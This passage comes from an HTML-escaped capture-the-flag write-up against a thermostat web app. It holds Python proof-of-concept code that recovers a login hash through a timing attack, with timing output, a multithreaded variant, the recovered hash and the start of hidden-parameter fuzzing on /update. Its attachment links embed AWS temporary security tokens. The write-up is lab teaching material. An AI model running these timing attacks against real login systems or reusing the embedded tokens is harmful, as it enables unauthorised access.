\u0026quot;length-constant\u0026quot; time ensures that an attacker cannot extract the hash of a password in an on-line system using a timing attack, then crack it off-line\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eThe standard way to check if two sequences of bytes (strings) are the same is to compare the first byte, then the second, then the third, and so on. As soon as you find a byte that isn\u0026#39;t the same for both strings, you know they are different and can return a negative response immediately. If you make it through both strings without finding any bytes that differ, you know the strings are the same and can return a positive result. This means that comparing two strings can take a different amount of time depending on how much of the strings match.\u003c/em\u003e \u0026quot; [1]\u003c/p\u003e\n\n\u003cp\u003eTime to create a PoC for a timing attack. The idea is to send each hash within the range from 0x00 to 0xFF for the first two chars, filled with \u003ccode\u003eff\u003c/code\u003e until 64 chars in total (padding()). These first two chars represent a byte (hex digest) in the hash. After sending the request we save the time elapsed in a dictionary.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epadding\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;f\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e64\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;http://104.196.12.98/\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eURL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eelapsed\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etotal_seconds\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etimes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003etimes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ezfill\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epadding\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ezfill\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimes\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI got:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{ ...\n    \u0026quot;ef\u0026quot;: 0.6429750000000001,\n    \u0026quot;f0\u0026quot;: 0.6428805,\n    \u0026quot;f1\u0026quot;: 0.6429075,\n    \u0026quot;f2\u0026quot;: 0.6429579999999999,\n    \u0026quot;f3\u0026quot;: 0.6426725,\n    \u0026quot;f4\u0026quot;: 0.6429405000000001,\n    \u0026quot;f5\u0026quot;: 0.6432635,\n    \u0026quot;f6\u0026quot;: 0.6427134999999999,\n    \u0026quot;f7\u0026quot;: 0.6425565,\n    \u0026quot;f8\u0026quot;: 0.6429004999999999,\n    \u0026quot;f9\u0026quot;: 1.1436354999999998,\n    \u0026quot;fa\u0026quot;: 0.6428285,\n    \u0026quot;fb\u0026quot;: 0.642867,\n    \u0026quot;fc\u0026quot;: 0.6430150000000001,\n    \u0026quot;fd\u0026quot;: 0.642695,\n    \u0026quot;fe\u0026quot;: 0.643376,\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote that \u0026#39;f9\u0026#39; took 1.14 seconds, which is 0.5s more than the others. Now I should test the next two chars prefixing \u003ccode\u003ef9\u003c/code\u003e in the hash and so on until I got the complete hash.\u003c/p\u003e\n\n\u003ch4 id=\"multithreading\"\u003eMultithreading\u003c/h4\u003e\n\n\u003cp\u003eDoing this timing attack in a single thread would take hours. So we need to do it using multithreading \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"send_request_multi.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/376/8252def4c290fed687fcbc3778c243c3a3eefe3f/send_request_multi.py?response-content-disposition=attachment%3B%20filename%3D%22send_request_multi.py%22%3B%20filename%2A%3DUTF-8%27%27send_request_multi.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=52367d108df6c584190cc6783d3411775896a5267de59e467e05fe9fc1a28f00\" data-attachment-type=\"text/x-python\"\u003esend_request_multi.py (F451376)\u003c/a\u003e. I found out that the most reliable results from my VPS network were using a maximum of 16 threads. The general idea was to build a queue with hex range 0x00 to 0xff and make each thread do a request checking the elapsed time. Being greater than 0.5s from the previous \u003ccode\u003ebase_value\u003c/code\u003e time means that we found another \u0026quot;byte\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s just see the main function that each thread will perform:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eprocess_data\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ethreadName\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Thread main function\n\u003c/span\u003e    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"n\"\u003efound\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003eexitFlag\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# A flag to stop all threads\n\u003c/span\u003e        \u003cspan class=\"n\"\u003equeueLock\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eacquire\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Acquire Queue\n\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003eworkQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e \n            \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"n\"\u003equeueLock\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erelease\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Release Queue\n\u003c/span\u003e            \u003cspan class=\"n\"\u003etime_elapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Send the hash and get time_elapsed\n\u003c/span\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003etime_elapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e999\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Last two chars case\n\u003c/span\u003e                \u003cspan class=\"n\"\u003efound\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\n            \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003etime_elapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_time_value\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.8\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Possibly a network issue\n\u003c/span\u003e                \u003cspan class=\"n\"\u003etime_elapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Try again\n\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etime_elapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_time_value\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.4\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Maybe we have found\n\u003c/span\u003e                \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efound\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.6\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# Waiting to confirm\n\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eagain\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# Confirming\n\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eagain\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_time_value\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n                    \u003cspan class=\"n\"\u003efound\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efound\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Found!\n\u003c/span\u003e                    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Found: \u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003equeueLock\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erelease\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Editor_6_.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/372/049570c5cdb612d0df42e9b3ca7941484012dad7/Editor_6_.mp4?response-content-disposition=attachment%3B%20filename%3D%22Editor_6_.mp4%22%3B%20filename%2A%3DUTF-8%27%27Editor_6_.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=bd4155a07bc1fd64e3f72c4b66a1a7fc2513ff03f4c03b9e72107be4b2bbe759\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/372/049570c5cdb612d0df42e9b3ca7941484012dad7/Editor_6_.mp4?response-content-disposition=attachment%3B%20filename%3D%22Editor_6_.mp4%22%3B%20filename%2A%3DUTF-8%27%27Editor_6_.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=bd4155a07bc1fd64e3f72c4b66a1a7fc2513ff03f4c03b9e72107be4b2bbe759\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you have extra time you could watch all the full execution here: \u003ca title=\"https://youtu.be/y50QDcvS9OM\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2Fy50QDcvS9OM\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/y50QDcvS9OM\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eFinally we can login using \u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u003c/code\u003e as hash.\u003c/p\u003e\n\n\u003ch3 id=\"thermostat-web-app\"\u003eThermostat web app\u003c/h3\u003e\n\n\u003cp\u003eNow that we are authenticated we can browse the application. All the endpoints are working, except /diagnostics which gives Unauthorized. Further, under /control there is a form to change the temperature by doing a POST to /setTemp. I took some time testing this endpoint sending all kinds of payloads, but it seemed to only accept numbers. (Note: python accepts underscore in numeric literals [14]). \u003c/p\u003e\n\n\u003ch4 id=\"update\"\u003e/update\u003c/h4\u003e\n\n\u003cp\u003eWhen we access /update we get:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eImmediately this caught my eye. What if there is some hidden parameters? To do this we have a lot of options: Param Miner (Burp), Turbo Intruder (Burp), Parameth, WFuzz, FFUF and so on. As at this time I was looking for performance I choose Turbo Intruder: \u003cu\u003eTurbo Intruder is a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results. It\u0026#39;s intended to complement Burp Intruder by handling attacks that require exceptional speed, duration, or complexity.\u003c/u\u003e [15] Attacks are configured using Python.\u003c/p\u003e\n\n\u003cp\u003eRequest:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?%s HTTP/1.1\nHost: 104.196.12.98\nCookie: 